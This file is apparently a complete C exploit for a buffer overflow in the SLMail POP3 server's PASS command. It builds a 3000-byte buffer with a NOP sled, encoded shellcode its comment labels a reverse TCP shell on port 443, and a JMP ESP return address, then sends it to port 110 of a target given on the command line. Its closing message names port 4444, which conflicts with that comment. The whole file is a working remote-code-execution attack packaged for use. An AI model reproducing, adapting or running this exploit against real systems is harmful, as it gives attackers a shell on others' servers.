/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] reverse tcp 443 
unsigned char shellcode[] = 
"\xbb\xbe\x49\x28\x27\xdd\xc0\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xc0\x04\x31\x58\x0e\x03\xe6\x47\xca\xd2\xea\xb0\x88"
"\x1d\x12\x41\xed\x94\xf7\x70\x2d\xc2\x7c\x22\x9d\x80\xd0\xcf"
"\x56\xc4\xc0\x44\x1a\xc1\xe7\xed\x91\x37\xc6\xee\x8a\x04\x49"
"\x6d\xd1\x58\xa9\x4c\x1a\xad\xa8\x89\x47\x5c\xf8\x42\x03\xf3"
"\xec\xe7\x59\xc8\x87\xb4\x4c\x48\x74\x0c\x6e\x79\x2b\x06\x29"
"\x59\xca\xcb\x41\xd0\xd4\x08\x6f\xaa\x6f\xfa\x1b\x2d\xb9\x32"
"\xe3\x82\x84\xfa\x16\xda\xc1\x3d\xc9\xa9\x3b\x3e\x74\xaa\xf8"
"\x3c\xa2\x3f\x1a\xe6\x21\xe7\xc6\x16\xe5\x7e\x8d\x15\x42\xf4"
"\xc9\x39\x55\xd9\x62\x45\xde\xdc\xa4\xcf\xa4\xfa\x60\x8b\x7f"
"\x62\x31\x71\xd1\x9b\x21\xda\x8e\x39\x2a\xf7\xdb\x33\x71\x90"
"\x28\x7e\x89\x60\x27\x09\xfa\x52\xe8\xa1\x94\xde\x61\x6c\x63"
"\x20\x58\xc8\xfb\xdf\x63\x29\xd2\x1b\x37\x79\x4c\x8d\x38\x12"
"\x8c\x32\xed\xb5\xdc\x9c\x5e\x76\x8c\x5c\x0f\x1e\xc6\x52\x70"
"\x3e\xe9\xb8\x19\xd5\x10\x2b\x2c\x21\x1a\x9c\x58\x37\x1a\xe3"
"\x23\xbe\xfc\x89\x43\x97\x57\x26\xfd\xb2\x23\xd7\x02\x69\x4e"
"\xd7\x89\x9e\xaf\x96\x79\xea\xa3\x4f\x8a\xa1\x99\xc6\x95\x1f"
"\xb5\x85\x04\xc4\x45\xc3\x34\x53\x12\x84\x8b\xaa\xf6\x38\xb5"
"\x04\xe4\xc0\x23\x6e\xac\x1e\x90\x71\x2d\xd2\xac\x55\x3d\x2a"
"\x2c\xd2\x69\xe2\x7b\x8c\xc7\x44\xd2\x7e\xb1\x1e\x89\x28\x55"
"\xe6\xe1\xea\x23\xe7\x2f\x9d\xcb\x56\x86\xd8\xf4\x57\x4e\xed"
"\x8d\x85\xee\x12\x44\x0e\x0e\xf1\x4c\x7b\xa7\xac\x05\xc6\xaa"
"\x4e\xf0\x05\xd3\xcc\xf0\xf5\x20\xcc\x71\xf3\x6d\x4a\x6a\x89"
"\xfe\x3f\x8c\x3e\xfe\x15";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = &evil;
      ptr = ptr + 652; // 2608 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 351);
      *(long*)&evil[2606] = 0x5F4A358F; // # 5F4A358F   FFE4    JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
